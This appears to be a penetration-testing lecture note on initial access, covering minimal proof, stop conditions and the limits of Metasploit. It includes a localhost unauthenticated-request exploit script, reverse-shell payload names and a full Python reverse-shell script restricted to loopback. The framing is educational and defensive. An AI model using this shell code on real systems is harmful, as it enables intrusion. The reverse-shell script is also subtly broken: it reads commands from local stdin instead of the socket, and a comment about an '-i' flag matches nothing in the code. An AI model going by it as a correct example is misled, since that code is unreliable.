Initial Access and Exploitation Basics

Summary

Initial access is the moment a vulnerability becomes a foothold. This lecture covers the
discipline of choosing an exploit, proving access minimally, and — critically — stopping as
soon as you have what you need.

The most common failure mode for beginners is not inability to exploit; it is
inability to stop. A pentest that turns into an unsupervised takeover of the
client's environment is a failed engagement even if everything worked.

Companion to ex-01..ex-06 (the technical depth) and cs161-04 (the
reasoning about chain construction). This note is the operational judgement.

The decision, in order

  1. Is the target in scope and reachable?      (tcm-01, tcm-03)
  2. Does the vulnerability have a known fix?   (if yes: report, do not exploit)
  3. Is exploitation explicitly permitted?     (ROE, not your judgement)
  4. What is the SMALLEST proof?
  5. What is the blast radius of the technique?
  6. What is my stop condition?

Step 2 matters more than beginners expect. If a patch exists, the
finding is "this host is unpatched" and the proof is nmap -sV output.
Exploiting it proves nothing extra and creates risk. Reserve exploitation for
cases with no fix, for demonstration impact, or where the client explicitly
asked.

Proving access minimally

  MINIMUM PROOF              NOT NECESSARY
  ------------------------- --------------------------------------------
  whoami                     a user account
  hostname                   a domain admin
  id                         SYSTEM
  proof that a specific      reading the entire customer database
    record is reachable
  that a write is possible   writing a webshell and leaving it
  that this host sees        pivot to 40 more hosts
    the internal network

The right column is where engagements go wrong. The standard is the
smallest demonstration that proves the vulnerability is real and
impactful. If the finding is "unauthenticated access to a read-only
endpoint", curl on that endpoint is the whole exploit.

Metasploit: what it is and when it hurts

  WHAT IT IS GOOD FOR
    - fast validation that a CVE is real
    - enumerating options for an exploit you have not read
    - session management once you have several footholds
    - generating a report of what you did
    - learning the shape of an exploit, by reading the module source

  WHAT IT IS BAD FOR
    - you learn nothing about the vulnerability
    - it hides the request it sends, so you cannot explain it
    - a scanner/matcher is not an exploit
    - default payloads are noisy and can break fragile services
    - you will not be able to reproduce it manually if it fails

  RULE: if you cannot run it without Metasploit, you do not understand it.
        Use Metasploit to confirm, then reproduce by hand.

# No Metasploit, same outcome. This is what you are being taught.

# A worked example: demonstrating an unauthenticated service read.
# Loopback only. This is the *shape* of an exploit, in plain Python.
python3 - <<'PY' | tee 01-manual-exploit.txt
import socket

def exploit(host, port):
    """Connect, send a request that should have required authentication,
    and see what comes back. The vulnerability is the SERVER'S decision
    to answer at all - not anything clever in this script."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(b"GET /admin/records HTTP/1.1\r\nHost: localhost\r\n"
              b"Connection: close\r\n\r\n")
    resp = b""
    while len(resp) < 8192:
        chunk = s.recv(4096)
        if not chunk: break
        resp += chunk
    s.close()
    head, _, body = resp.partition(b"\r\n\r\n")
    status = head.split(b"\r\n")[0].decode(errors="replace")
    print(f"  status : {status}")
    print(f"  bytes  : {len(body)}")
    return status, body

print("  === PROOF: unauthenticated access to /admin/records ===")
print()
status, body = exploit("127.0.0.1", 8080)
print()
if b"401" in status.encode() or b"403" in status.encode():
    print("  VERDICT: not vulnerable. The service enforced auth.")
elif b"200" in status.encode():
    print("  VERDICT: VULNERABLE. 200 without credentials.")
    print("  STOP HERE. That is sufficient evidence. Record:")
    print("    - the exact request sent")
    print("    - the response status and length")
    print("    - a redacted snippet proving the data class")
    print("  Do not read the whole table. Do not enumerate further.")
PY
cat 01-manual-exploit.txt

That last paragraph is the note. The exploit is a socket connection. The
vulnerability is a server-side authorisation decision. Everything else is
bookkeeping.

When the exploit destabilises the target

  If the exploit may crash the service:
    1. STOP. Do not retry blindly.
    2. Confirm the service is actually down (check the target, don't assume)
    3. Contact the technical contact immediately - this is what they are for
    4. Record exactly what you ran and when
    5. Do not attempt recovery. That is the client's change process, and
       their backups, and their outage, not yours.

  If the exploit may corrupt data:
    same rule. Data damage during a pentest is a reportable incident caused
    by the tester, and "the CVE description did not mention writes" is not
    a defence.

Stop conditions, written before you start

  Write these BEFORE the exploitation phase, and honour them without
  exception, regardless of how interesting the access turns out to be:

  - I will not proceed beyond <host> unless it is in scope
  - I will not attempt persistence unless persistence is in the ROE
  - I will not exfiltrate more than the minimum proving impact
  - I will not run any exploit whose mechanism I cannot describe to the
    client's engineer in plain language
  - I will stop and call on any of:
      * a service going down
      * data appearing to be modified
      * a system I did not expect (a different network, a different org)
      * credential access I did not anticipate
  - Maximum simultaneous exploits against one host: 1

The fourth condition is the best one. If you cannot explain the exploit
to the client's engineer, you should not have run it. That single rule
eliminates most of the genuinely damaging outcomes.

Terminology

Term Meaning
Initial access Gaining the first foothold
Exploit Code or technique that leverages a vulnerability
Payload What the exploit does once it succeeds
Metasploit module A packaged exploit
Meterpreter Metasploit's post-exploitation framework
Reverse shell The target connects out to you
Bind shell You connect in to the target
Blast radius Maximum possible damage
Proof of concept Minimal demonstration that a bug is real
Stop condition A predefined circumstance that halts testing
Known-fix bypass Exploiting something that already has a patch
Blind exploit No output; success is inferred from behaviour

# --- 1. read the module before you run it. always. ---
cat > 01-module-review.md <<'EOF'
# Module review checklist

Before running any exploit module, answer all of these **on paper**:

- [ ] `show options` — what am I setting, and are the defaults right for
      the host I actually scanned?
- [ ] `show info` — what CVE is this, is there a fix, when was it disclosed?
- [ ] `show source` — read the module. Does it do anything besides what I
      expect? (drop a shell? write a file? crash the service?)
- [ ] Which payload? `windows/meterpreter/reverse_tcp` vs a plain
      `windows/shell/reverse_tcp` — prefer the quieter one.
- [ ] What is the blast radius, and what would I do if it crashed the service?
- [ ] Is exploitation of this specific issue permitted by the ROE?
- [ ] Is a *patched* version deployed? If so, stop: the finding is
      "unpatched", proved by the version string.

If you cannot answer the source question, you are not ready to run it.
EOF
echo "written: 01-module-review.md"

# --- 3. reverse vs bind shell: the security difference, made explicit ---
python3 - <<'PY' | tee 03-shell-direction.txt
print("  REVERSE SHELL (target dials out to you)")
print("    target  ->  attacker :4444")
print("    + works through firewalls and NAT")
print("    + the target's egress is usually allowed")
print("    - your IP is in the target's logs")
print("    - outbound connections are exactly what EDR looks for")
print()
print("  BIND SHELL (you dial in to the target)")
print("    attacker  ->  target :4444")
print("    + leaves no outbound connection in the logs")
print("    - needs an inbound firewall change on the target")
print("    - fails behind NAT")
print()
print("  PROFESSIONAL CHOICE")
print("    Use a bind shell where the ROE requires it.")
print("    Otherwise use reverse, but:")
print("      - to a port you control, on your own machine")
print("      - with a unique, high source port per engagement")
print("      - and log every session you open")
print()
print("  NEVER: an internet-hosted listener. Ever. Your shell is the")
print("  target's command execution; a public listener is a stranger's.")
PY

# --- 4. the canonical loopback reverse shell, explained line by line ---
cat > 04-revshell.py <<'PY'
#!/usr/bin/env python3
"""Reverse shell, loopback only.

This is the shape of every reverse shell you will ever see. Knowing it
means you recognise it in a detection rule and can write one yourself.
"""
import socket, subprocess, os, sys

HOST, PORT = "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 4444

# GUARD: refuse anything that is not loopback. A reverse shell pointed at
# a public host is a backdoor, not a lab exercise.
import ipaddress
try:
    if not ipaddress.ip_address(HOST).is_loopback:
        print("REFUSED: this lab only connects to loopback", file=sys.stderr)
        sys.exit(3)
except ValueError:
    print("REFUSED: HOST must be a literal loopback IP", file=sys.stderr)
    sys.exit(3)

print(f"[+] connecting back to {HOST}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def send(cmd: str) -> bytes:
    s.sendall((cmd + "\n").encode()); return s.recv(65536)

# tell the operator who we are - every real one does this
send(f"uid={os.getuid()} cwd={os.getcwd()} user={os.getenv('USER','?')}")

while True:
    try:
        s.recv(4096)                       # prompt
    except socket.error:
        break
    try:
        line = sys.stdin.readline()
    except (KeyboardInterrupt, EOFError):
        break
    if not line: break
    cmd = line.strip()
    if cmd == "exit": break
    # -i keeps the pipe open so interactive tools work: the detail that
    # separates a real shell from `sh -c one-command`
    p = subprocess.run(cmd, shell=True, capture_output=True,
                       text=True, timeout=30, executable="/bin/bash")
    out = (p.stdout + p.stderr).encode() or b"(no output)\n"
    try:
        s.sendall(out[:60000])
    except socket.error:
        break
s.close()
PY

# --- 5. post-exploitation is NOT part of this note ---
cat > 05-scope-boundary.md <<'EOF'
# Where initial access ends

Initial access is complete the moment you have a working foothold on an
in-scope host, and the evidence recorded. Everything after that is
post-exploitation, and it is a **separate authorisation decision**.

Do not treat post-exploitation as the natural continuation of the exploit.
If the ROE says "prove access to the web server", you have finished when
you have `whoami` output on the web server. Reading the application
database is a different request.

This boundary is what separates a professional engagement from an incident.
EOF
